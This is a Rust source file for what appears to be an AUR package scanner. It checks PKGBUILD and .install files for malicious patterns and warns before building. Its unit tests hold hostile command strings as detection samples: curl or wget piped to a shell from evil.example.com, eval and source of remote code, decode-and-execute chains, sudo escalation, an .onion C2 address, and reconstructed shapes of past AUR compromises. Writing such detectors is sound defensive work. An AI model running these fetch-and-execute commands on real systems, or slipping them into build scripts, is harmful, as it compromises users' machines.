/// Prefetched PKGBUILD (+ optional .install) from cgit scan.
pub(crate) struct FetchedSource {
    pub pkgbuild: String,
    pub install: Option<(String, String)>,
}

/// Re-scan the git checkout vs cgit pre-scan (TOCTOU / cache lag).
/// Mismatch → same prompt as pre-scan. prefetched=None → full local scan.
pub(crate) fn verify_local_clone_or_rescan(pkgbase: &str, dir: &std::path::Path, prefetched: Option<&FetchedSource>) {
    let Ok(local_pkgbuild) = std::fs::read_to_string(dir.join("PKGBUILD")) else {
        // Can't read what was just cloned -- the build step right after
        // this will fail loudly on the same thing, nothing useful to add.
        return;
    };
    let local_install = resolve_install_filename(&local_pkgbuild)
        .and_then(|name| std::fs::read_to_string(dir.join(&name)).ok().map(|src| (name, src)));

    if let Some(pre) = prefetched {
        let install_matches = match (&local_install, &pre.install) {
            (None, None) => true,
            (Some((ln, ls)), Some((pn, ps))) => ln == pn && ls == ps,
            _ => false,
        };
        if local_pkgbuild == pre.pkgbuild && install_matches {
            return; // identical to what was already scanned -- nothing to redo
        }
        println!(
            "{} '{}' clone differs from the copy already scanned via cgit -- verifying the clone directly...",
            ">>>".yellow().bold(),
            pkgbase
        );
    } else {
        println!(
            "{} '{}' wasn't scanned before cloning (cgit fetch failed or this pkgbase was only resolved after cloning) -- scanning the clone directly...",
            ">>>".yellow().bold(),
            pkgbase
        );
    }

    let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&local_pkgbuild)
        .into_iter()
        .map(|f| ("PKGBUILD".to_string(), f))
        .collect();
    if let Some((name, src)) = &local_install {
        pkg_findings.extend(scan_pkgbuild_source(src).into_iter().map(|f| (name.clone(), f)));
    }

    if pkg_findings.is_empty() {
        return;
    }

    let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
        .collect();
    let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::Suspicious)
        .collect();

    if !atomic.is_empty() {
        print_finding_block(pkgbase, "Alert, matched a known-malicious IOC", &atomic, true, SourceOrigin::LocalClone(dir));
    }
    if !suspicious.is_empty() {
        print_finding_block(pkgbase, "Warning, detected suspicious fragment", &suspicious, false, SourceOrigin::LocalClone(dir));
    }

    eprintln!();
    eprintln!(
        "{} '{}''s cloned PKGBUILD/.install content (which differs from what was pre-scanned) \
        matches known-suspicious patterns. Review it yourself before proceeding:",
        ">>>".red().bold(),
        pkgbase
    );
    eprintln!("    {}", dir.display());
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    if !answer.trim().eq_ignore_ascii_case("y") {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }
}

/// Source location for the "read the full file" footer.
pub(crate) enum SourceOrigin<'a> {
    /// Fetched via cgit, before any `git clone` happened.
    Cgit,
    /// Read straight from an on-disk clone at this directory.
    LocalClone(&'a std::path::Path),
}

// ── --scan: report-only PKGBUILD/.install audit ─────────────────────────────

/// --scan report body (no "Continue?" gate). true = clean.
fn scan_report(label: &str, pkgbuild_src: &str, install: Option<(String, String)>, local_dir: Option<&std::path::Path>) -> bool {
    let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(pkgbuild_src)
        .into_iter()
        .map(|f| ("PKGBUILD".to_string(), f))
        .collect();
    if let Some((name, src)) = &install {
        pkg_findings.extend(scan_pkgbuild_source(src).into_iter().map(|f| (name.clone(), f)));
    }

    // Same name-based check as scan_aur_pkgbuilds_or_abort - `--scan`/
    // `--install-pkgbuild --scan` are separate entry points from the
    // install-time path, so this needs its own copy rather than relying
    // on the caller to have gone through that function first. `label` is
    // the pkgbase for `scan_report_aur` and the local directory's name
    // for `scan_report_local` - both are what the user is about to
    // build, so it's the right thing to check either way.
    if let Some(finding) = known_compromised_package_finding(label) {
        pkg_findings.push(finding);
    }

    if pkg_findings.is_empty() {
        println!("{} {}: no suspicious patterns found.", ">>>".green().bold(), label.bold());
        return true;
    }

    let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::ConfirmedIoc)
        .collect();
    let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
        .filter(|(_, f)| f.severity == Severity::Suspicious)
        .collect();

    if !atomic.is_empty() {
        let origin = match local_dir { Some(d) => SourceOrigin::LocalClone(d), None => SourceOrigin::Cgit };
        print_finding_block(label, "Alert, matched a known-malicious IOC", &atomic, true, origin);
    }
    if !suspicious.is_empty() {
        let origin = match local_dir { Some(d) => SourceOrigin::LocalClone(d), None => SourceOrigin::Cgit };
        print_finding_block(label, "Warning, detected suspicious fragment", &suspicious, false, origin);
    }
    false
}

/// --scan AUR name via cgit. false on fetch fail or any finding.
pub(crate) fn scan_report_aur(pkg: &str) -> bool {
    println!("{} Scanning {} (AUR)...", ">>>".green().bold(), pkg.bold());
    let Some(pkgbuild_src) = fetch_aur_pkgbuild(pkg) else {
        eprintln!("{} could not fetch PKGBUILD for '{}' from the AUR.", ">>> Error:".red().bold(), pkg);
        return false;
    };
    let install = resolve_install_filename(&pkgbuild_src)
        .and_then(|name| fetch_aur_file(pkg, &name).map(|src| (name, src)));
    scan_report(pkg, &pkgbuild_src, install, None)
}

/// --scan local checkout. false if unreadable or any finding.
pub(crate) fn scan_report_local(label: &str, dir: &std::path::Path) -> bool {
    println!("{} Scanning {} ({})...", ">>>".green().bold(), label.bold(), dir.display());
    let Ok(pkgbuild_src) = std::fs::read_to_string(dir.join("PKGBUILD")) else {
        eprintln!("{} no PKGBUILD found in {}.", ">>> Error:".red().bold(), dir.display());
        return false;
    };
    let install = resolve_install_filename(&pkgbuild_src)
        .and_then(|name| std::fs::read_to_string(dir.join(&name)).ok().map(|src| (name, src)));
    scan_report(label, &pkgbuild_src, install, Some(dir))
}

/// Print emerge-style alert box (file/line + cgit or local path).
/// Both severities use the same strong colors; is_atomic is unused for render.
pub(crate) fn print_finding_block(pkg: &str, headline: &str, findings: &[&(String, Finding)], is_atomic: bool, origin: SourceOrigin) {
    let bar = "===================================";
    let arrow_str = ">>>";
    let _ = is_atomic;

    eprintln!();
    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), bar.truecolor(250, 16, 66).bold());
    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), format!("{} ({})", headline, pkg).yellow().bold());
    eprintln!("{} {}", arrow_str.truecolor(250, 16, 66).bold(), bar.truecolor(250, 16, 66).bold());

    let arrow = || arrow_str.truecolor(255, 140, 0).bold();

    let mut files_seen: Vec<&str> = Vec::new();
    for (file, finding) in findings {
        let loc = if finding.line > 0 {
            format!("file {} line {}", file, finding.line)
        } else {
            format!("file {}", file)
        };
        eprintln!("{} {}: {}", arrow(), loc, finding.message);
        if !files_seen.contains(&file.as_str()) {
            files_seen.push(file.as_str());
        }
    }

    for file in files_seen {
        let anchor = findings.iter()
            .find(|(f, fi)| f == file && fi.line > 0)
            .map(|(_, fi)| format!("#n{}", fi.line))
            .unwrap_or_default();
        match &origin {
            SourceOrigin::Cgit => eprintln!(
                "{} Read full file: https://aur.archlinux.org/cgit/aur.git/tree/{}?h={}{}",
                arrow(), file, pkg, anchor
            ),
            SourceOrigin::LocalClone(dir) => eprintln!(
                "{} Read full file: {}",
                arrow(), dir.join(file).display()
            ),
        }
    }
}

#[cfg(test)]
mod scanner_tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_detected() {
        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
        assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
    }

    // ── base64 -d | sh / xxd -r -p | bash / source <(curl ...) ──────────

    #[test]
    fn base64_pipe_shell_detected() {
        assert!(is_base64_pipe_shell("base64 -d payload.b64 | sh"));
        assert!(is_base64_pipe_shell("echo \"$PAYLOAD\" | base64 --decode | bash"));
        assert!(is_base64_pipe_shell("base64 -d payload.b64 | env bash"));
        // decoding alone (no shell on the receiving end) already gets
        // flagged by is_base64_decode above -- this check specifically
        // wants the pipe-into-shell case
        assert!(!is_base64_pipe_shell("base64 -d payload.b64 -o payload.bin"));
        assert!(!is_base64_pipe_shell("base64 -d payload.b64 | tee out.bin"));
        assert!(!is_base64_pipe_shell("# base64 -d payload.b64 | sh"));
    }

    #[test]
    fn xxd_pipe_shell_detected() {
        assert!(is_xxd_pipe_shell("xxd -r -p payload.hex | bash"));
        assert!(is_xxd_pipe_shell("xxd -rp payload.hex | sh"));
        assert!(is_xxd_pipe_shell("cat payload.hex | xxd -p -r | zsh"));
        // -r without -p (default xxd hexdump-with-offsets format) or no
        // pipe into a shell at all must not flag
        assert!(!is_xxd_pipe_shell("xxd -r dump.hex | sh"));
        assert!(!is_xxd_pipe_shell("xxd -r -p payload.hex -o payload.bin"));
        assert!(!is_xxd_pipe_shell("# xxd -r -p payload.hex | bash"));
    }

    #[test]
    fn source_process_subst_detected() {
        assert!(is_source_process_subst("source <(curl -sSL https://evil.example.com/x)"));
        assert!(is_source_process_subst(". <(wget -qO- http://evil.example.com/x)"));
        // process substitution not fed to source/. shouldn't flag
        assert!(!is_source_process_subst("diff <(curl -sSL https://evil.example.com/x) file.txt"));
        assert!(!is_source_process_subst("source ./helpers.sh"));
        assert!(!is_source_process_subst("# source <(curl https://evil.example.com/x)"));
    }

    #[test]
    fn decode_pipe_shell_and_process_subst_flagged_in_full_scan() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
build() {
  base64 -d payload.b64 | bash
  source <(curl -sSL https://evil.example.com/stage2)
}
"#;
        let findings = scan_pkgbuild_source(pkgbuild);
        assert!(findings.iter().any(|f| f.message.contains("base64/hex-encoded blob")));
        assert!(findings.iter().any(|f| f.message.contains("process substitution")));
    }

    #[test]
    fn base64_decode_detected() {
        assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
        assert!(is_base64_decode("base64 --decode < blob.txt > out"));
        assert!(!is_base64_decode("makepkg --version"));
    }

    #[test]
    fn chmod_777_detected() {
        assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
        assert!(is_chmod_777("chmod -R 777 build/"));
        assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
    }

    #[test]
    fn raw_ipv4_detected() {
        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
        assert!(contains_raw_ipv4("192.168.1.1"));
        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
        assert!(!contains_raw_ipv4("no ip here at all"));
        // Known false positive, documented on contains_raw_ipv4: a 4-part
        // dotted version where every part is <= 255 reads as an IP too.
        assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
    }

    #[test]
    fn clean_pkgbuild_has_no_findings() {
        let src = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert!(scan_pkgbuild_source(src).is_empty());
    }

    #[test]
    fn top_level_command_substitution_flagged_in_full_scan() {
        // the real repro: a markdown code-span backtick left in pkgdesc,
        // pasted from a GitHub README - runs the literal command `bwrap`
        // (no args) the instant anything sources this PKGBUILD, before
        // build() or the sandbox are anywhere in the picture.
        let pkgbuild = "pkgname=aura-emerge\npkgver=2.1.4\npkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgrel=1\n";
        let findings = scan_pkgbuild_source(pkgbuild);
        assert!(findings.iter().any(|f| f.message.contains("command substitution")));

        // same construct inside a function body (only runs when makepkg
        // actually calls that function) must NOT flag.
        let pkgver_func = "pkgname=foo\npkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n";
        assert!(scan_pkgbuild_source(pkgver_func).is_empty());
    }

    #[test]
    fn validpgpkeys_single_line() {
        let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
        assert_eq!(parse_validpgpkeys(src), vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]);
    }

    #[test]
    fn validpgpkeys_multi_line_mixed_quotes() {
        let src = "validpgpkeys=('AAAA0123456789ABCDEF0123456789ABCDEF0123'\n              \"BBBB0123456789ABCDEF0123456789ABCDEF0123\")\n";
        assert_eq!(
            parse_validpgpkeys(src),
            vec![
                "AAAA0123456789ABCDEF0123456789ABCDEF0123",
                "BBBB0123456789ABCDEF0123456789ABCDEF0123"
            ]
        );
    }

    #[test]
    fn validpgpkeys_absent() {
        assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
    }

    #[test]
    fn known_malicious_package_detected() {
        assert_eq!(
            contains_known_malicious_package("npm install atomic-lockfile"),
            Some("atomic-lockfile")
        );
        assert_eq!(
            contains_known_malicious_package("bun install js-digest"),
            Some("js-digest")
        );
        assert_eq!(contains_known_malicious_package("npm install typescript"), None);
    }

    #[test]
    fn decoy_tool_binary_detected() {
        // Real August-2026-wave shape: install a bundled ELF under a
        // generic build-tool name.
        assert!(has_decoy_tool_binary(r#"install -Dm755 "$srcdir/linter" "$pkgdir/usr/bin/linter""#));
        assert!(has_decoy_tool_binary(r#"install -Dm755 hasher "$pkgdir/usr/bin/hasher""#));
        assert!(has_decoy_tool_binary("chmod +x \"$pkgdir/usr/bin/validator\""));
        assert!(has_decoy_tool_binary("chmod 755 $pkgdir/usr/bin/optimizer"));
        // Commented out - must not flag.
        assert!(!has_decoy_tool_binary("# install -Dm755 validator /usr/bin/validator"));
        // Unrelated install (docs, not an executable under a decoy name).
        assert!(!has_decoy_tool_binary(r#"install -Dm644 "$pkgdir/usr/share/doc/README""#));
        // Substring of the decoy name, not the name itself - must not flag.
        assert!(!has_decoy_tool_binary(r#"install -Dm755 validators.conf "$pkgdir/etc/validators.conf""#));
        // A legitimate binary install under an unrelated name - must not flag.
        assert!(!has_decoy_tool_binary(r#"install -Dm755 "$srcdir/aura-emerge" "$pkgdir/usr/bin/aura-emerge""#));
    }

    #[test]
    fn decoy_tool_binary_flagged_in_full_scan() {
        let src = "build() {\n  install -Dm755 \"$srcdir/minifier\" \"$pkgdir/usr/bin/minifier\"\n}\n";
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.message.contains("generic build-tool name")));
    }

    #[test]
    fn known_compromised_package_name_detected() {
        assert!(is_known_compromised_package("archutil"));
        assert!(is_known_compromised_package("openconnect-sso"));
        assert!(is_known_compromised_package("StorageExplorer-Bin")); // case-insensitive
        // Not a substring match - a lookalike/unrelated name must not flag.
        assert!(!is_known_compromised_package("archutil2"));
        assert!(!is_known_compromised_package("my-archutil-fork"));
        assert!(!is_known_compromised_package("firefox"));
    }

    #[test]
    fn known_compromised_package_name_flagged_via_scan_report() {
        // `--scan`/`--install-pkgbuild --scan` go through `scan_report`,
        // a separate entry point from the install-time
        // `scan_aur_pkgbuilds_or_abort` - make sure the name check fires
        // there too, on a totally clean PKGBUILD body.
        let clean = "pkgname=archutil\npkgver=1.0\npkgrel=1\nbuild() {\n  make\n}\n";
        assert!(!scan_report("archutil", clean, None, None));
        assert!(scan_report("firefox", clean, None, None));
    }

    #[test]
    fn foreign_pkg_manager_install_detected() {
        assert!(is_foreign_pkg_manager_install("npm install atomic-lockfile"));
        assert!(is_foreign_pkg_manager_install("bun add js-digest"));
        assert!(is_foreign_pkg_manager_install("pip install requests"));
        // Local/project installs - no named external package - must NOT flag.
        assert!(!is_foreign_pkg_manager_install("npm install"));
        assert!(!is_foreign_pkg_manager_install("npm ci"));
        assert!(!is_foreign_pkg_manager_install("npm install ."));
        assert!(!is_foreign_pkg_manager_install("npm install --production"));
        assert!(!is_foreign_pkg_manager_install("yarn add ./vendor/local-pkg"));
    }

    #[test]
    fn parse_install_filename_variants() {
        assert_eq!(
            parse_install_filename("pkgname=foo\ninstall=foo.install\npkgver=1.0"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_filename("install='foo.install'"),
            Some("foo.install".to_string())
        );
        assert_eq!(parse_install_filename("# install=foo.install"), None);
        assert_eq!(parse_install_filename("pkgname=foo\npkgver=1.0"), None);
    }

    #[test]
    fn parse_install_filename_ignores_trailing_inline_comment() {
        // the real repro: an inline comment on the install= line (even one
        // that re-mentions ${pkgname}, as a copy-pasted note might) used to
        // get glued onto the value, producing a filename that could never
        // exist on disk - the .install hook then silently never got read
        // or scanned, with no error anywhere.
        assert_eq!(
            parse_install_filename("install=foo.install   # some comment"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_filename("install=${pkgname}.install   # note: mentions ${pkgname} again"),
            Some("${pkgname}.install".to_string())
        );
        assert_eq!(
            resolve_install_filename(
                "pkgname=scaner-test\ninstall=${pkgname}.install                                                   # тест интерполяции ${pkgname}\n"
            ),
            Some("scaner-test.install".to_string())
        );
        // a quoted value keeps a '#' that's actually inside the quotes
        assert_eq!(
            parse_install_filename("install=\"foo#bar.install\"  # trailing comment"),
            Some("foo#bar.install".to_string())
        );
    }

    #[test]
    fn simple_var_ignores_trailing_inline_comment() {
        assert_eq!(simple_var("pkgname=foo   # the package name", "pkgname"), Some("foo".to_string()));
        assert_eq!(simple_var("pkgdesc=\"a #1 package\"  # comment", "pkgdesc"), Some("a #1 package".to_string()));
        assert_eq!(simple_var("pkgname=(a b)  # split package", "pkgname"), None);
    }

    #[test]
    fn hex_escape_payload_detected() {
        assert!(is_hex_escape_payload(
            r#"printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/x"#
        ));
        // Legitimate hex doesn't use \x escapes: checksums, fingerprints, hashes.
        assert!(!is_hex_escape_payload(
            "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
        ));
        assert!(!is_hex_escape_payload(
            "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
        ));
        assert!(!is_hex_escape_payload("commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"));
        // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
        assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
    }

    #[test]
    fn strip_version_operator_variants() {
        assert_eq!(strip_version_operator("glibc>=2.38"), "glibc");
        assert_eq!(strip_version_operator("libc.so=6-64"), "libc.so");
        assert_eq!(strip_version_operator("bash"), "bash");
        assert_eq!(strip_version_operator("foo<=1.2"), "foo");
        assert_eq!(strip_version_operator("foo<1.2"), "foo");
    }

    #[test]
    fn parse_depends_on_basic() {
        let qi = "\
Name            : bash
Version         : 5.2.32-1
Description     : The GNU Bourne Again shell
Depends On      : readline  libc.so=6-64
Optional Deps   : None
Required By     : filesystem

Name            : coreutils
Version         : 9.5-1
Depends On      : glibc>=2.38  acl  attr
Required By     : base

Name            : filesystem
Version         : 2024.01-1
Depends On      : None
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["readline", "libc.so", "glibc", "acl", "attr"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_wrapped_continuation() {
        // Simulates pacman wrapping a long Depends On value onto a second,
        // indented line with no field label.
        let qi = "\
Name            : bigpkg
Version         : 1.0-1
Depends On      : dep-one  dep-two  dep-three
                  dep-four  dep-five
Required By     : None
";
        let deps = parse_depends_on_all(qi);
        for expect in ["dep-one", "dep-two", "dep-three", "dep-four", "dep-five"] {
            assert!(deps.contains(expect), "missing: {}", expect);
        }
        assert_eq!(deps.len(), 5);
    }

    #[test]
    fn parse_depends_on_none_and_missing_field() {
        let qi = "\
Name            : justapkg
Version         : 1.0-1
Depends On      : None
Required By     : None
";
        assert!(parse_depends_on_all(qi).is_empty());
    }

    #[test]
    fn atomic_arch_style_pkgbuild_and_install_flagged() {
        let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=totally-legit-tool.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        let install_hook = r#"
post_install() {
  npm install atomic-lockfile
}
"#;
        let pkgbuild_findings = scan_pkgbuild_source(pkgbuild);
        assert!(pkgbuild_findings.is_empty(), "clean PKGBUILD should have no findings on its own");

        assert_eq!(parse_install_filename(pkgbuild), Some("totally-legit-tool.install".to_string()));

        let install_findings = scan_pkgbuild_source(install_hook);
        assert!(install_findings.iter().any(|f| f.message.contains("atomic-lockfile")));
        assert!(install_findings.iter().any(|f| f.severity == Severity::ConfirmedIoc));
    }

    #[test]
    fn findings_carry_correct_line_numbers() {
        let src = "pkgname=foo\npkgver=1.0\nbuild() {\n  chmod 777 \"$pkgdir\"\n}\n";
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, 4);
        assert_eq!(findings[0].severity, Severity::Suspicious);
    }

    #[test]
    fn known_malicious_package_is_atomic_arch_severity() {
        let src = "post_install() {\n  npm install atomic-lockfile\n}\n";
        let findings = scan_pkgbuild_source(src);
        // Hits both the exact-IOC check (AtomicArch) and the generic
        // foreign-package-manager heuristic (Suspicious) on the same line.
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious && f.line == 2));
    }

    #[test]
    fn malicious_pkgbuild_flagged() {
        let src = r#"
pkgname=evil
build() {
  curl -sSL http://185.220.101.5/stage2.sh | bash
  chmod 777 /tmp/evil
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert_eq!(findings.len(), 3);
    }

    // ── 2018 acroread/balz/minergate takeover ───────────────────────────
    //
    // Real incident: a hijacked orphaned AUR package fetched a persistence
    // script from a Pastebin raw URL and, once run, dropped a literal
    // `compromised.txt` marker into every home directory. Covered here by
    // two independent heuristics: the paste-site fetch (Suspicious, since
    // the mechanism alone has some legitimate uses) and the marker
    // filename itself (ConfirmedIoc, since there's no legitimate reason
    // for a PKGBUILD to reference it at all).

    #[test]
    fn paste_site_fetch_detected() {
        assert!(is_paste_site_fetch("curl -s https://pastebin.com/raw/AbCd1234 -o stage2.sh"));
        assert!(is_paste_site_fetch("wget -qO- https://ix.io/abcd | bash"));
        assert!(is_paste_site_fetch("curl https://0x0.st/xyz.sh"));
        assert!(!is_paste_site_fetch("curl -sSL https://github.com/foo/bar/releases/download/v1/foo.tar.gz"));
        assert!(!is_paste_site_fetch("# curl https://pastebin.com/raw/AbCd1234 (just a comment)"));
        // Mentioning a paste site without an actual fetch verb shouldn't fire.
        assert!(!is_paste_site_fetch("# see https://pastebin.com/raw/AbCd1234 for context"));
    }

    #[test]
    fn compromised_marker_detected() {
        assert!(has_compromised_marker("touch /compromised.txt"));
        assert!(has_compromised_marker("echo pwned > \"$HOME/compromised.txt\""));
        assert!(!has_compromised_marker("# compromised.txt was the 2018 marker file (comment only)"));
        assert!(!has_compromised_marker("this file is totally fine"));
    }

    #[test]
    fn acroread_2018_style_pkgbuild_flagged() {
        // Reconstructed shape of the real 2018 payload: fetch a script off
        // Pastebin and pipe it into the shell, which then drops the marker
        // file. Should trip curl-pipe-shell (Suspicious), paste-site-fetch
        // (Suspicious), and - since the marker also happens to appear in
        // this build() - the exact-IOC check (ConfirmedIoc).
        let src = r#"
pkgname=acroread
build() {
  curl -sSL https://pastebin.com/raw/deadbeef | bash
  echo pwned > /compromised.txt
}
"#;
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.severity == Severity::ConfirmedIoc
            && f.message.contains("compromised.txt")));
        assert!(findings.iter().any(|f| f.message.contains("paste-dump site")));
        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
    }

    // ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
    //
    // Reported mechanism: a compromised package's build path added a
    // binary named `validator` and executed it with `sudo` during
    // packaging, reusing Tor-backed second-stage delivery from the June
    // 2026 Atomic Arch campaign.

    #[test]
    fn sudo_escalation_detected() {
        assert!(is_sudo_escalation("sudo ./validator --init"));
        assert!(is_sudo_escalation("pkexec /tmp/helper"));
        assert!(is_sudo_escalation("doas sh -c 'id'"));
        // Declaring sudo as a dependency, not invoking it, must not flag.
        assert!(!is_sudo_escalation("makedepends=('sudo')"));
        assert!(!is_sudo_escalation("depends=('sudo' 'other')"));
        assert!(!is_sudo_escalation("# sudo ./validator (just a comment)"));
        assert!(!is_sudo_escalation("build() {\n  make\n}"));
    }

    #[test]
    fn onion_address_detected() {
        assert!(is_onion_address(
            "source=(\"http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/stage2\")"
        ));
        assert!(is_onion_address("C2=abc123def456.onion"));
        assert!(!is_onion_address("# see the project's .onion mirror in the wiki (comment only)"));
        assert!(!is_onion_address("source=(\"https://github.com/foo/bar/archive/v1.tar.gz\")"));
    }

    #[test]
    fn known_malicious_hash_detected() {
        assert_eq!(
            contains_known_malicious_hash(
                "sha256sums=('e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77')"
            ),
            Some("e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77")
        );
        assert_eq!(
            contains_known_malicious_hash("sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"),
            None
        );
    }

    #[test]
    fn openconnect_sso_style_pkgbuild_flagged() {
        // Reconstructed shape of the reported incident: an adopted
        // package's build() gains a bundled `validator` binary and runs
        // it with sudo. Should trip the sudo-escalation heuristic
        // (Suspicious) - no ConfirmedIoc here since the binary name alone
        // isn't a matchable exact indicator, only the behavior is.
        let pkgbuild = r#"
pkgname=openconnect-sso
pkgver=0.13.0
pkgrel=2
source=("https://github.com/vlaci/openconnect-sso/archive/v$pkgver.tar.gz"
        "validator")
build() {
  cd "$pkgname-$pkgver"
  sudo ./validator --setup
  make
}
"#;
        let findings = scan_pkgbuild_source(pkgbuild);
        assert!(findings.iter().any(|f| f.severity == Severity::Suspicious
            && f.message.contains("sudo/pkexec/doas")));
    }

    // ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────

    #[test]
    fn curl_pipe_absolute_path_shell_detected() {
        assert!(is_curl_pipe_shell("wget -O- https://evil.example.com/x | /bin/sh"));
        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | /usr/bin/bash"));
        assert!(is_curl_pipe_shell("wget -qO- https://evil.example.com/x | env bash"));
        assert!(is_curl_pipe_shell("curl -sL https://evil.example.com/x | env -S sh"));
        // still shouldn't false-positive on a plain download-to-file
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o /usr/bin/foo"));
    }

    // ── eval $(curl ...) ──────────────────────────────────────────────

    #[test]
    fn eval_remote_exec_detected() {
        assert!(is_eval_remote_exec(r#"eval "$(curl -sSL https://evil.example.com/x)""#));
        assert!(is_eval_remote_exec("eval `wget -qO- https://evil.example.com/x`"));
        // bare eval on a local variable/array must not flag
        assert!(!is_eval_remote_exec("eval \"${some_array[@]}\""));
        assert!(!is_eval_remote_exec("# eval \"$(curl https://evil.example.com/x)\" (comment)"));
    }

    // ── python -c exec/eval + openssl decrypt ────────────────────────────

    #[test]
    fn python_inline_exec_detected() {
        assert!(is_python_inline_exec(
            "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
        ));
        assert!(is_python_inline_exec("python -c 'os.system(\"id\")'"));
        // python -c doing something benign shouldn't flag
        assert!(!is_python_inline_exec("python3 -c 'print(1+1)'"));
        assert!(!is_python_inline_exec("python3 setup.py build"));
    }

    #[test]
    fn openssl_decrypt_detected() {
        assert!(is_openssl_decrypt("openssl enc -d -aes-256-cbc -in payload.enc -k \"$KEY\" | sh"));
        assert!(is_openssl_decrypt("openssl aes-256-cbc -d -in blob -out out"));
        // encrypting (not decrypting) or unrelated openssl calls shouldn't flag
        assert!(!is_openssl_decrypt("openssl enc -aes-256-cbc -in payload -out payload.enc"));
        assert!(!is_openssl_decrypt("openssl dgst -sha256 foo.tar.gz"));
    }

    // ── install=${pkgname}.install resolution ────────────────────────────

    #[test]
    fn resolve_install_filename_interpolated() {
        let src = "pkgname=foo\ninstall=${pkgname}.install\npkgver=1.0\n";
        assert_eq!(resolve_install_filename(src), Some("foo.install".to_string()));

        let src2 = "pkgname=bar\ninstall=$pkgname.install\npkgver=1.0\n";
        assert_eq!(resolve_install_filename(src2), Some("bar.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_literal_unchanged() {
        let src = "pkgname=foo\ninstall=custom-hook.install\n";
        assert_eq!(resolve_install_filename(src), Some("custom-hook.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_pkgbase_split_package() {
        let src = "pkgbase=mysuite\npkgname=(mysuite-a mysuite-b)\ninstall=${pkgbase}.install\n";
        assert_eq!(resolve_install_filename(src), Some("mysuite.install".to_string()));
    }

    #[test]
    fn resolve_install_filename_unresolvable_bails() {
        // pkgname is an array (split package) and install= references it -
        // no single value to substitute, must return None rather than a
        // garbage filename that would 404 anyway.
        let src = "pkgname=(a b)\ninstall=${pkgname}.install\n";
        assert_eq!(resolve_install_filename(src), None);
    }

    #[test]
    fn atomic_arch_style_pkgbuild_with_interpolated_install_still_caught() {
        // Same shape as atomic_arch_style_pkgbuild_and_install_flagged above,
        // but with the realistic ${pkgname}.install form instead of the
        // literal name - this is the case that used to silently skip the
        // install hook entirely.
        let pkgbuild = r#"
